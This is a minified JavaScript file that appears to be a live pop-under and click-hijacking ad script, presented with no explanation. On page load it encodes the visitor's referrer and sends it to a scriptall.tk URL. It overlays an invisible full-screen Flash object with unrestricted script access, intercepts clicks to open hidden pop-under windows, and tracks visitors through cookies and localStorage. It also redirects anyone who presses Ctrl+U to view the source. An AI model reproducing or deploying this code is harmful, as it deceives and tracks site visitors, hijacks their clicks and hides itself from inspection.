function encode64(r){r=escape(r);var e,t,a,c,h,A="",o="",d="",k=0;do e=r.charCodeAt(k++),t=r.charCodeAt(k++),o=r.charCodeAt(k++),a=e>>2,c=(3&e)<<4|t>>4,h=(15&t)<<2|o>>6,d=63&o,isNaN(t)?h=d=64:isNaN(o)&&(d=64),A=A+keyStr.charAt(a)+keyStr.charAt(c)+keyStr.charAt(h)+keyStr.charAt(d),e=t=o="",a=c=h=d="";while(k<r.length);return A}var keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
!function(){function e(e){return/\{\s*\[native code\]\s*\}/.test(""+e)}function t(){Y=o(M.include),q=o(M.exclude)}function n(e,t){for(var n=t.parentNode;null!=n;){if(n==e)return!0;n=n.parentNode}return!1}function i(e){return Array.prototype.slice.call(document.querySelectorAll(e))}function o(e){var t=[];if(e.length)for(var n=0;n<e.length;n++){var o=i(e[n]);t=o.length?t.concat(o):t}return t}function r(e){t();var i=0,o=0;if(Y.length)for(var r=0;r<Y.length;r++)n(Y[r],e)&&i++;if(q.length)for(var r=0;r<q.length;r++)n(q[r],e)&&o++;return-1==e.className.indexOf("dtnoppu")&&(0==M.include.length||Y.length&&(Y.indexOf(e)>=0||i>0))&&(0==q.length||q.length&&q.indexOf(e)<0&&0==o)?!0:!1}function a(e){var t=document.getElementById("hrthwg345eEl");0==e.button&&(t.style.width=H&&navigator.mimeTypes["application/x-shockwave-flash"]?"100%":"0px",t.style.height=H&&navigator.mimeTypes["application/x-shockwave-flash"]?"100%":"0px",t.style.visibility="visible")}function l(){function e(e,t){for(var n in t)e.setAttribute(n,t[n]);return e}var t=document;t.getElementById("hrthwg345eEl")||(D=e(t.createElement("object"),{type:"application/x-shockwave-flash",id:"hrthwg345eEl",name:"hrthwg345eEl",data:M.swfurl}),D.appendChild(e(document.createElement("param"),{name:"wmode",value:"transparent"})),D.appendChild(e(document.createElement("param"),{name:"menu",value:"false"})),D.appendChild(e(document.createElement("param"),{name:"allowscriptaccess",value:"always"})),D.appendChild(e(document.createElement("param"),{name:"allowfullscreen",value:"true"})),D.appendChild(e(document.createElement("param"),{name:"autoplay",value:"true"})),D.setAttribute("style","position:fixed;visibility:visible;left:0;top:0;width:1px;height:1px;z-index:2147483647;overflow:hidden;"),t.body.insertBefore(D,t.body.firstChild),D.focus(),t.addEventListener("mousemove",function(e){N=e.clientX,O=e.clientY})),setTimeout(function(){"fluid-width-video-wrapper"==document.getElementById("hrthwg345eEl").parentNode.className&&(document.getElementById("hrthwg345eEl").parentNode.style.padding="0")},500)}function d(e,t,n){window!=window.top?s(e,t+(n?"; expires="+new Date((new Date).getTime()+n).toUTCString():"")):document.cookie=e+"="+t+";"+(n?" expires="+new Date((new Date).getTime()+n).toUTCString()+";":"")+" path=/"}function c(e){if(window!=window.top){for(var t=u(e).toString().split("; "),n=0;n<t.length;n++)if("expires"==t[n].split("=")[0])return Date.parse(t[n].split("=")[1])<Date.now()?(m(e),!1):t[0]}else for(var t=document.cookie.toString().split("; "),n=0;n<t.length;n++)if(t[n].split("=")[0]==e)return t[n].split("=")[1];return!1}function s(e,t){if(f()){if(window.localStorage)return window.localStorage.setItem(e,t),!0;try{var n=document.body;return n.addBehavior("#default#userData"),n.setAttribute(e,t),n.save("auth"),!0}catch(i){return!1}}}function u(e){if(window.localStorage){var t=window.localStorage.getItem(e);return t?t:!1}var n=document.body;try{n.addBehavior("#default#userData"),n.load("auth");var t=n.getAttribute(e);return t?t:!1}catch(i){return!1}}function m(e){if(window.localStorage&&window.localStorage.removeItem(e))return!0;var t=document.body;try{return t.addBehavior("#default#userData"),t.load("auth"),t.removeAttribute(e),!0}catch(n){return!1}}function f(){try{return localStorage.setItem("storageSupport",1),localStorage.removeItem("storageSupport"),"localStorage"in window&&null!==window.localStorage}catch(e){return e.code===DOMException.QUOTA_EXCEEDED_ERR&&0===localStorage.length,!1}}function w(e){function t(){return!M.self&&!M.wp&&P.chrome&&P.version&&P.version.split(".")[0]&&parseInt(P.version.split(".")[0])>=41&&!!navigator.mimeTypes["application/x-shockwave-flash"]}c(R)||(d(R,1,1e3*S.timing.period),d(U,1,1e3*S.timing.init_delay),d(j,0,-1),d(V,0,-1),M.shown=0),!S.timing.period&&M.shown<S.timing.max&&(d(j,0,-1),d(V,0,-1)),S.timing.init_delay||d(U,0,-1);var n=c(j)-0+1;if(!(n<=S.timing.max&&M.shown<S.timing.max)&&S.timing.max||c(V)-0||c(U)-0)return!0;if(!M.wp&&P.chrome&&!(P.ios||P.android||P.blackberry||P.winphone||P.ucbrowser)&&navigator.mimeTypes["application/x-shockwave-flash"]?X&&(d(j,n,1e3*S.timing.period),d(V,1,S.timing.delay?1e3*S.timing.delay:-1)):(M.shown++,d(j,n,1e3*S.timing.period),d(V,1,S.timing.delay?1e3*S.timing.delay:-1)),P.chrome&&!(P.ios||P.android||P.blackberry||P.winphone||P.ucbrowser)||S.mobiletab&&(P.android||P.blackberry||P.winphone)){if(t()){var i=document,o=window,r=function(){function t(e,t){for(var n in t)e.setAttribute(n,t[n]);return e}if(o.owr1t0hglor=function(t,n){M.self&&location.assign(S.url),Q?v(t):g(n);var o=i.getElementById("hrthwg345eEl");o.style.width=0,o.style.height=0,o.style.visibility="hidden",Q&&M.ftg&&e.target.click()},i.getElementById("hrthwg345eEl")?(D=i.getElementById("hrthwg345eEl"),D.setAttribute("style","position:fixed;visibility:visible;left:0;top:0;width:1px;height:1px;z-index:2147483647;overflow:hidden;")):(D=t(i.createElement("object"),{type:"application/x-shockwave-flash",id:"hrthwg345eEl",name:"hrthwg345eEl",data:M.swfurl}),D.appendChild(t(document.createElement("param"),{name:"wmode",value:"transparent"})),D.appendChild(t(document.createElement("param"),{name:"menu",value:"false"})),D.appendChild(t(document.createElement("param"),{name:"allowscriptaccess",value:"always"})),D.appendChild(t(document.createElement("param"),{name:"allowfullscreen",value:"true"})),D.appendChild(t(document.createElement("param"),{name:"autoplay",value:"true"})),D.setAttribute("style","position:fixed;visibility:visible;left:0;top:0;width:1px;height:1px;z-index:2147483647;overflow:hidden;"),i.body.insertBefore(D,i.body.firstChild),D.focus(),i.addEventListener("mousemove",function(e){N=e.clientX,O=e.clientY}),i.addEventListener("mousedown",a)),!H){try{Q?y(e):g(e),x(),_()}catch(t){}var n=document.getElementById("hrthwg345eEl");n.setAttribute("style","position:fixed;visibility:hidden;left:0;top:0;width:0;height:0;z-index:2147483647;overflow:hidden;"),document.removeEventListener("mousedown",a)}};i.body?r():i.addEventListener("DOMContentLoaded",r)}else Q?y(e):g(e),x(),_();return M.clicked_url=null,!0}if(P.android||P.blackberry||P.winphone)if((M.mself||!M.ftg)&&(e.preventDefault?e.preventDefault():e.returnValue=!1),I(e),P.fb)M.window=window.open(S.url),x();else if(P.winphone)location.assign(S.url);else{try{Q?b(e):g(e)}catch(l){}C(e),x(),k()}else P.ios?((M.mself||!M.ftg)&&(e.preventDefault?e.preventDefault():e.returnValue=!1),I(e),P.ucbrowser?("undefined"!=typeof e&&e.preventDefault(),M.window=window.open(S.url),x()):(P.fb?(M.window=window.open(S.url),x()):(M.window=top.window.open(M.mself?location.href:S.url),x(),M.window=!1,k()),C(e))):((M.self||!M.ftg)&&(e.preventDefault?e.preventDefault():e.returnValue=!1),M.ftg||(e.stopPropagation?e.stopPropagation():e.cancelBubble=!0),Q?P.opr||P.ucbrowser?y(e):E(e):g(e),_(),M.window&&(M.self||p(),x()),M.window=!1);M.clicked_url=null}function p(){try{M.window.blur(),window!=window.top?window.top.focus():M.window.opener.window.focus(),P.msie||window.self.window.blur(),window.focus(),P.safari&&setTimeout("window.focus();",500),P.firefox&&h()}catch(e){}}function h(){M.window.open("about:blank").close()}function g(e,t){var n=document.createEvent("MouseEvents"),i=document.createElement("a");i.href=t?t:M.self?location.href:S.url,i.target="_blank",n.initMouseEvent("click",!0,!0,window,P.firefox?0:!0,0,0,0,0,!1,!1,!1,!1,0,null),i.dispatchEvent(n),M.ftg&&(e&&e.target&&e.target.click?e.target.click():A(e))}function v(e){M.window=window.window.open(M.self?location.href:S.url,"window_"+Math.ceil(1e5*Math.random()),M.self||e?"":M.fs?B:M.options),x()}function y(e){M.window=window.open(M.self?location.href:S.url,"window_"+Math.ceil(1e5*Math.random())),e&&M.ftg&&e.target.click()}function b(){M.window=window.open(M.mself?location.href:S.url,"window_"+Math.ceil(1e5*Math.random()))}function E(e){M.window=L.window.open(M.self?location.href:S.url,"window_"+Math.ceil(1e5*Math.random()),P.chrome&&M.wp||M.self?"":M.fs?B:M.options),P.firefox||P.safari||C(e)}function x(){if(M.window)try{M.window.opener=null}catch(e){}}function k(){M.mself?location.assign(S.url):M.clicked_url&&location.assign(M.clicked_url)}function _(){M.self?location.assign(S.url):M.clicked_url&&location.assign(M.clicked_url)}function C(e){M.ftg&&(e.target.click&&!P.isMobile?e.target.click():A(e))}function A(e){var t;t=!e.touches||P.ios&&P.safari?P.chrome||P.yandex?"mousedown":"click":P.android&&P.firefox?"touchend":P.android&&P.safari?"touchstart":P.android&&P.chrome?"click":"touchend";var n=e.target,i=document.createEvent("MouseEvents");i.initEvent(t,!0,!0),n.dispatchEvent(i)}function I(e){M.ftg||(e.stopPropagation?e.stopPropagation():e.cancelBubble=!0,e.stopImmediatePropagation())}var S={dimensions:{height:760,width:1e3},hardcore:0,mobiletab:!1,timing:{delay:45,init_delay:0,max:1,period:3600},url:"//scriptall.tk/30908/4c33443a173-92ba6e8143-cb49f55976b/"+encode64(document.referrer),key:"46f3eb0e98ba1f34a396ebc7a9ba9f7c"},M={clicked_url:null,options:"toolbar=no,directories=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=1,width="+S.dimensions.width+",height="+S.dimensions.height+",left="+Math.round((screen.width-S.dimensions.width)/2)+",top="+Math.round((screen.height-S.dimensions.height)/2),shown:0,window:!1,self:!1,mself:!0,swfurl:"//d3m79ugzs2d8im.cloudfront.net/data/ptm.swf",fs:!0,wp:!1,include:[],exclude:[],ftg:!1},B=M.options.replace(new RegExp("(height=[\\d]{1,})","g"),"height="+window.screen.availHeight).replace(new RegExp("(width=[\\d]{1,})","g"),"width="+window.screen.availWidth).replace(new RegExp("(top=[\\d]{1,})","g"),"top=0").replace(new RegExp("(left=[\\d]{1,})","g"),"left=0"),L=self;try{L=top!=self&&"string"==typeof top.document.location.toString()?top:self}catch(T){}var N,O,P=function(){var e=navigator.userAgent.toLowerCase(),t={webkit:/webkit/.test(e),mozilla:/mozilla/.test(e)&&!/(compatible|webkit)/.test(e),chrome:/chrome/.test(e)||/crios/.test(e),msie:/msie/.test(e)&&!/opera/.test(e),edge:/edge/.test(e),ie11:/mozilla/.test(e)&&/trident/.test(e)&&/rv:11/.test(e),firefox:/firefox/.test(e),safari:/safari/.test(e)&&!(/chrome/.test(e)||/crios/.test(e)),opera:/opera/.test(e),opr:/opr/.test(e),ya:/yabrowser/.test(e),fb:/fbav/.test(e),ucbrowser:/ubrowser/.test(e)||/ucbrowser/.test(e),android:/android/i.test(e),puf:/puffin/i.test(e),ios:/iphone|ipad|ipod/i.test(e),ios9:/os 9/.test(e)&&/like mac os x/.test(e),blackberry:/blackberry|bb/i.test(e),winphone:/windows\sphone/i.test(e),isMobile:/Android|BlackBerry|iPhone|iPad|iPod|Opera\sMini|IEMobile/i.test(e)};return t.version=t.safari?(e.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(e.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1],t.mac=/mac os/.test(e)&&!t.ios&&t.chrome&&parseInt(t.version)>=48,t}(),z="ontouchstart"in document.documentElement?"touchstart":"click",R="ppu_main_"+S.key,j="ppu_sub_"+S.key,V="ppu_delay_"+S.key,U="ppu_idelay_"+S.key,X=0,Y=[],q=[];Array.isArray||(Array.isArray=function(e){return"[object Array]"===Object.prototype.toString.call(e)}),Array.prototype.indexOf||(Array.prototype.indexOf=function(e,t){void 0===t&&(t=0),0>t&&(t+=this.length),0>t&&(t=0);for(var n=this.length;n>t;t++)if(t in this&&this[t]===e)return t;return-1}),S.timing.period||d(j,0,-1);var H=!1;window.sl=function(){H=!0;var e=new Array;return e=[P.opr,P.mac]};var Q=e(window.open);if(!M.wp&&P.chrome&&!(P.ios||P.android||P.blackberry||P.winphone||P.ucbrowser))if(document.body)l();else var W=setInterval(function(){document.body&&(l(),clearInterval(W))},10);if(document.addEventListener)P.ios||P.android||P.blackberry||P.winphone?(document.addEventListener(P.android&&P.firefox||P.ios9?"touchend":P.android&&P.safari&&!P.chrome?"touchend":P.android&&P.chrome?M.ftg?"mousedown":"touchstart":z,function(e){if(M.clicked_url=null,r(e.target)){var t=c(j)-0+1;"a"!==e.target.tagName.toLowerCase()||M.ftg||!(t<=S.timing.max&&M.shown<S.timing.max)&&S.timing.max||c(V)-0||c(U)-0?M.clicked_url="a"===e.target.tagName.toLowerCase()?e.target.href:null:(M.clicked_url=null,P.android&&!M.ftg&&I(e)),w(e)}}),P.ios&&document.addEventListener("touchstart",function(e){if(r(e.target)&&"a"===e.target.tagName.toLowerCase()){var t=c(j)-0+1;!(t<=S.timing.max&&M.shown<S.timing.max)&&S.timing.max||c(V)-0||c(U)-0||(e.preventDefault?e.preventDefault():e.returnValue=!1,I(e))}}),P.chrome||P.ios9||document.addEventListener(P.ios||P.android&&P.firefox?"mousemove":"touchmove",function(e){r(e.target)&&w(e)},!1)):document.addEventListener(P.chrome?"mousedown":"click",function(e){if(M.clicked_url=null,r(e.target))if(M.clicked_url="a"===e.target.tagName.toLowerCase()?e.target.href:null,!M.wp&&P.chrome&&!(P.ios||P.android||P.blackberry||P.winphone||P.ucbrowser)&&navigator.mimeTypes["application/x-shockwave-flash"]){if(!X){w(e),e.stopPropagation?e.stopPropagation():e.cancelBubble=!0;var t=c(j)-0+1;!(t<=S.timing.max&&M.shown<S.timing.max)&&S.timing.max||c(V)-0||c(U)-0||(a(e),X=1,M.shown++,d(j,t,1e3*S.timing.period),d(V,1,S.timing.delay?1e3*S.timing.delay:-1),X=0)}}else w(e)},!0);else if(document.attachEvent)document.attachEvent("onclick",function(e){M.clicked_url=null;var t=P.msie?e.srcElement:e.target?e.target:"";r(t)&&(M.clicked_url="a"===t.tagName.toLowerCase()?t.href:null,w(e))});else var F=setInterval(function(){"undefined"!=typeof document.body&&document.body&&(document.body.onclick=function(e){M.clicked_url=null;var t=P.msie?e.srcElement:e.target?e.target:"";r(t)&&(M.clicked_url="a"===t.tagName.toLowerCase()?t.href:null,w(e))},clearInterval(F))},10);setInterval(function(){c(R)||(d(R,1,1e3*S.timing.period),d(U,1,1e3*S.timing.init_delay),d(j,0,-1),d(V,0,-1),M.shown=0),!S.timing.period&&M.shown<S.timing.max&&(d(j,0,-1),d(V,0,-1)),S.timing.init_delay||d(U,0,-1)},1e3),S.hardcore&&(window.onbeforeunload=function(){return M.shown?void 0:(M.shown++,setTimeout(function(){window.location.href=S.url},10),"")})}();
function seeU(e){
if (e.ctrlKey && e.which == 85){
window.location.replace('http://www.asubindo.net/');
return false;}}
document.onkeydown = seeU;
